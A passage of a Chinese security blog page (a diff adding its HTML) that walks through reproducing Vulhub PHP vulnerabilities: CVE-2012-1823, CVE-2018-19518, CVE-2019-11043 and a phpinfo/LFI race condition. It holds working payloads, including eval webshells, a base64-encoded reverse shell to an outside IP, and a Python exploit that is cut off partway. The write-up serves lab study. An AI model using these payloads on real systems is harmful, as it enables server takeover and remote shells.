@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>Vulhub之php - 明月归的小站</title>
+  
+    <meta name="keywords" content="Vulhub,CVE">
+  
+
+  
+    <meta name="description" content="本篇博客主要复现了Vulhub上的php部分漏洞！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">Vulhub之php</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/05/05/Vulhub%E4%B9%8Bphp/">
+      Vulhub之php
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年5月5日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要复现了Vulhub上的php部分漏洞！</p>
+<a id="more"></a>
+
+<h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致代码执行。</p>
+<p>WEB 中，</p>
+<ul>
+<li><p><strong>Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器</strong></p>
+</li>
+<li><p><strong>Web Application 一般指PHP、Java、Asp.net等应用程序</strong></p>
+</li>
+<li><p><strong>cgi： Web Server 与 Web Application 之间数据交换的一种协议</strong></p>
+</li>
+<li><p><strong>FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似</strong></p>
+</li>
+<li><p><strong>PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序</strong></p>
+</li>
+<li><p><strong>PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理</strong></p>
+</li>
+</ul>
+<p>在整个网站架构中，Web Server（如Apache）只是内容的分发者。如果客户端请求的是 <code>index.html</code>，那么Web Server会去文件系统中找到这个文件，发送给浏览器，下图分发的是静态数据。</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/html.png" style="zoom:80%;">
+
+<p>如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/cgi.png" style="zoom:80%;">
+
+<p>当Web Server收到 index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>
+<p>更详细的内容参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzx-hjl/p/10583849.html">https://www.cnblogs.com/zzx-hjl/p/10583849.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<p>本漏洞只出现在以cgi模式运行的php中，影响版本 <code>php &lt; 5.3.12 or php &lt; 5.4.2</code>。</p>
+<p>这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接访问一个php文件加上<code>-s</code>就能看到源码</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200505214143.png" style="zoom:80%;">
+
+<p>除了<code>-s</code>还有以下参数可用：</p>
+<ul>
+<li><code>-c</code> 指定php.ini文件的位置</li>
+<li><code>-n</code> 不要加载php.ini文件</li>
+<li><code>-d</code> 指定配置项</li>
+<li><code>-b</code> 启动fastcgi进程</li>
+<li><code>-T</code> 执行指定次该文件</li>
+<li><code>-h</code>和<code>-?</code> 显示帮助</li>
+</ul>
+<p>我们可以构造下面的请求来执行代码：</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200505214846.png" style="zoom:80%;">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">/index.php?-d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>这个漏洞被爆出来以后，PHP官方对其进行了修补，发布了新版本5.4.2及5.3.12，但这个修复是不完全的，可以被绕过，进而衍生出CVE-2012-2311漏洞，此时我们可以空格+<code>-</code>绕过。</p>
+<h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致命令执行。</p>
+<p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p>
+<p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞环境关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    $imap = @imap_open(<span class="string">&#x27;&#123;&#x27;</span>.$_POST[<span class="string">&#x27;hostname&#x27;</span>].<span class="string">&#x27;:993/imap/ssl&#125;INBOX&#x27;</span>, $_POST[<span class="string">&#x27;username&#x27;</span>], $_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该命令执行是无回显的，因此我们可以尝试着写马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%<span class="number">2</span>BJz5tb29uYmFjay5waHA%<span class="number">3</span>D|base64%<span class="number">09</span>-d|sh&#125;&amp;username=<span class="number">111</span>&amp;password=<span class="number">222</span></span><br></pre></td></tr></table></figure>
+
+<p>其中base64编码是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&gt;moonback.php</span><br></pre></td></tr></table></figure>
+
+<p>或者不用这样麻烦，直接加上<code>;</code>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%3d;ls&gt;a&#125;&amp;username=111&amp;password=222</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>YmFzaCAtaSA%<span class="number">2</span>BJiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzkwMDAgMD4mMQ%<span class="number">3</span>D%<span class="number">3</span>D|base64%<span class="number">09</span>-d|bash&#125;&amp;username=<span class="number">111</span>&amp;password=<span class="number">222</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p>
+<p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p>
+<p><strong>利用条件和影响范围：</strong></p>
+<p>利用条件以及漏洞影响范围。</p>
+<p>1、Nginx + php_fpm，且配置<code>location ~ [^/]\.php(/|$)</code>会将请求转发到php-fpm。<br>2、Nginx配置<code>fastcgi_split_path_info</code>并且以<code>^</code>开始以<code>$</code>，只有在这种条件下才可以通过换行符来打断正则表达式判断。 ps: 则允许<code>index.php/321 -&gt; index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br></pre></td></tr></table></figure>
+
+<p>3、<code>fastcgi_param</code>中<code>PATH_INFO</code>会被定义通过<code>fastcgi_param PATH_INFO $fastcgi_path_info;</code>，当然这个变量会在<code>fastcgi_params</code>默认定义。<br>4、在nginx层面没有定义对文件的检查比如<code>try_files $uri =404</code>，如果nginx层面做了文件检查，则请求不会被转发给php-fmp。</p>
+<p>nginx配置类似于：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">	<span class="attribute">server_name</span> _;</span><br><span class="line">	<span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">	<span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">	<span class="comment">#	try_files $uri =404;</span></span><br><span class="line">		<span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">		<span class="attribute">fastcgi_pass</span> <span class="number">172.16.88.3:9000</span>;</span><br><span class="line">		<span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">		<span class="attribute">include</span> fastcgi_params;</span><br><span class="line">		<span class="attribute">fastcgi_param</span> SCRIPT_FILENAME /var/www/html<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">		<span class="attribute">fastcgi_param</span> PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">		<span class="attribute">fastcgi_hide_header</span> X-Powered-By;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个漏洞在实际研究过程中对真实世界危害有限，其主要原因都在于大部分的nginx配置中都携带了对文件的检查，且默认的nginx配置不包含这个问题</p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp github地址：<a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p>
+<p>ubuntu安装go环境，直接用apt安装的是1.6版本，该脚本要求1.13及以上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:longsleep/golang-backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install golang-go</span><br></pre></td></tr></table></figure>
+
+<p>默认项目文件夹是<code>~/go</code>，接着就</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/neex/phuip-fpizdam</span><br></pre></td></tr></table></figure>
+
+<p>在<code>~/go/bin</code>下面就能看到编译成功的二进制文件了，跑exp:</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506102252.png" style="zoom:80%;">
+
+<p>然后就可以命令执行了</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506102412.png" style="zoom:80%;">
+
+<h2 id="利用phpinfo包含临时文件"><a href="#利用phpinfo包含临时文件" class="headerlink" title="利用phpinfo包含临时文件"></a>利用phpinfo包含临时文件</h2><h3 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞需要有包含点，并且有phpinfo页面，然后就能getshell，该漏洞与php版本无关</p>
+<p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p>
+<p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<p>这个时候就需要用到条件竞争，具体流程如下：</p>
+<ol>
+<li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li>
+<li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li>
+<li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li>
+<li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>
+<li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li>
+<li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li>
+</ol>
+<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>python2 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">host, port</span>):</span></span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: 